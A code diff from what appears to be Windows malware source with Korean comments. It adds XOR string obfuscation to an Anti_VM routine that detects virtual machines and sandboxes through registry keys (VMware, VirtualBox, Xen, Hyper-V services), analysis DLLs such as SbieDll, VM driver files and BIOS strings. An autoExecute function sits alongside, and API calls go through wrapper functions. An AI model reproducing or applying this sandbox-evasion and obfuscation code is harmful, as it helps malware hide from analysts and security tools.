@@ -3,8 +3,7 @@
 #include <iostream>
 #include <string>
 #include <list>
-#include "HashModule.h"
-#include "HashFunction.h"
+#include "HashFunction_initialize.h"
 //#include "wmic.h"
 
 void autoExecute() {
@@ -36,17 +35,17 @@ bool Anti_VM() {
     //std::string bios_info = wc.getBIOSInfo();
 
     HKEY hKey;
-    std::list<std::string> services = {"vpcbus",  "vpc-s3",  "vpcuhub",  "msvmmouf",  "VBoxMouse",  "VBoxGuest",  "VBoxGuest",  "VBoxSF",  "xenevtchn", "xennet",  "xennet6",  "xensvc",  "xenvdb"};
-    std::list<std::string> modules = { "dbghelp",  "SbieDll",  "api_log", "dir_watch",  "pstorec" };
-    std::list<std::string> drivers = { "hsfs.sys", "vmhgfs.sys", "prleth.sys", "prlfs.sys", "prlmouse.sys", "prlvideo.sys", "prl_pv32.sys", "vpc-s3.sys", "vmsrvc.sys",  "vmx86.sys", "vmnet.sys" };
-    std::list<std::string> bioses = { "VMware", "VBOX", "VMW", "Hyper-V", "hyper-v"};
+    std::list<std::string> services = { StringXOR("sufgpv", 5).c_str(), StringXOR("suf(v6", 5).c_str(), StringXOR("sufmpg", 5).c_str(), StringXOR("hvshhjpc", 5).c_str(), StringXOR("SGj}Hjpv`", 5).c_str(), StringXOR("SGj}Bp`vq", 5).c_str(),  StringXOR("SGj}Bp`vq", 5).c_str(), StringXOR("SGj}VC", 5).c_str(), StringXOR("}`k`sqfmk", 5).c_str(), StringXOR("}`kk`q", 5).c_str(), StringXOR("}`kk`q3", 5).c_str(), StringXOR("}`kvsf", 5).c_str(), StringXOR("}`ksag", 5).c_str()};
+    std::list<std::string> modules = { StringXOR("agbm`iu", 5).c_str(),  StringXOR("Vgl`Aii", 5).c_str(),  StringXOR("dulZijb", 5).c_str(), StringXOR("alwZrdqfm", 5).c_str(), StringXOR("uvqjw`f", 5).c_str() };
+    std::list<std::string> drivers = { StringXOR("mvcv+v|v", 5).c_str(), StringXOR("shmbcv+v|v", 5).c_str(), StringXOR("uwi`qm+v|v", 5).c_str(), StringXOR("uwicv+v|v", 5).c_str(), StringXOR("uwihjpv`+v|v", 5).c_str(), StringXOR("uwisla`j+v|v", 5).c_str(), StringXOR("uwiZus67+v|v", 5).c_str(), StringXOR("suf(v6+v|v", 5).c_str(), StringXOR("shvwsf+v|v", 5).c_str(),  StringXOR("sh}=3+v|v", 5).c_str(), StringXOR("shk`q+v|v", 5).c_str() };
+    std::list<std::string> bioses = { StringXOR("SHrdw`", 5).c_str(), StringXOR("SGJ]", 5).c_str(), StringXOR("SHR", 5).c_str(), StringXOR("M|u`w(S", 5).c_str(), StringXOR("m|u`w(s", 5).c_str()};
 
 
     /* 레지스트리 비교 */
-    if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vmware, Inc.\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, StringXOR("VJCQRDW@YYShrdw`)%Lkf+YYSHrdw`%Qjjiv", 5).c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
         return false;
     }
-    else if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vmware Inc\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+    else if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, StringXOR("VJCQRDW@YYShrdw`%LkfYYSHrdw`%Qjjiv", 5).c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
         return false;
     }
 
@@ -59,7 +58,7 @@ bool Anti_VM() {
     //    }
     //}
 
-    std::string prefix = "SYSTEM\\ControlSet001\\Services\\";
+    std::string prefix = StringXOR("V\VQ@HYYFjkqwjiV`q554YYV`wslf`vYY", 5).c_str();
     for (std::string service : services) {
         std::string tmp = prefix + service;
         if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE,tmp.c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
@@ -77,7 +76,7 @@ bool Anti_VM() {
     /* driver 파일 비교 */
     HANDLE hFind = INVALID_HANDLE_VALUE;
     WIN32_FIND_DATAA FindFileData;
-    hFind = FindFirstFileA_c("C:\\Windows\\System32\\*.sys", &FindFileData);
+    hFind = FindFirstFileA_c(StringXOR("F?YYRlkajrvYYV|vq`h67YY/+v|v", 5).c_str(), &FindFileData);
     if (hFind != INVALID_HANDLE_VALUE) {
         while (FindNextFileA_c(hFind, &FindFileData) != 0)
         {
